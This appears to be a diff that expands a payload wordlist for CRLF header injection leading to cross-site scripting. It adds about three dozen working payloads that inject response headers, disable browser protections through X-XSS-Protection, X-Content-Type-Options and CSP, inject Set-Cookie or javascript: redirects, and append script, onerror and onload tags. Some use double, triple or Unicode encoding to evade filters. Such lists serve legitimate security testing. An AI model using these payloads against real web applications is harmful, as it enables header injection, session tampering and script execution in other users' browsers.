@@ -1,1 +1,38 @@
-%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
+%0aContent-Type: text/html%0a%0a<script>alert(1)</script>
+
+Content-Type: text/html
+
+<script>alert(1)</script>
+
+Content-Type: text/html
+
+<script>alert(1)</script>
+%0d%0a%0d%0a<img src=x onerror=alert(1)>
+%0a%0a<img src=x onerror=alert(1)>
+
+
+<img src=x onerror=alert(1)>
+
+
+<img src=x onerror=alert(1)>
+%0d%0aX-XSS-Protection: 0%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0aX-XSS-Protection: 0%0d%0a%0d%0a<svg onload=alert(1)>
+%0d%0aX-Content-Type-Options: none%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0aContent-Security-Policy: default-src *%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0aSet-Cookie: xss=<script>alert(1)</script>
+%0d%0aLocation: javascript:alert(1)
+%0d%0aRefresh: 0; url=javascript:alert(1)
+%0d%0a%0d%0a<html><body><script>alert(1)</script></body></html>
+%0d%0a%0d%0a<html><body><img src=x onerror=alert(1)></body></html>
+%0d%0a%0d%0a<svg onload=alert(1)>
+%0d%0a%0d%0a<details open ontoggle=alert(1)>
+%0d%0a%0d%0a<body onload=alert(1)>
+%0d%0a%0d%0a<iframe src=javascript:alert(1)>
+%0d%0a%0d%0a<a href=javascript:alert(1)>XSS</a>
+%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
+%250d%250aContent-Type: text/html%250d%250a%250d%250a<script>alert(1)</script>
+%25250d%25250aContent-Type: text/html%25250d%25250a%25250d%25250a<script>alert(1)</script>
+%E5%98%8D%E5%98%8AContent-Type: text/html%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A<script>alert(1)</script>
+test%0d%0a%0d%0a<script>alert(1)</script>
+/path%0d%0a%0d%0a<script>alert(1)</script>
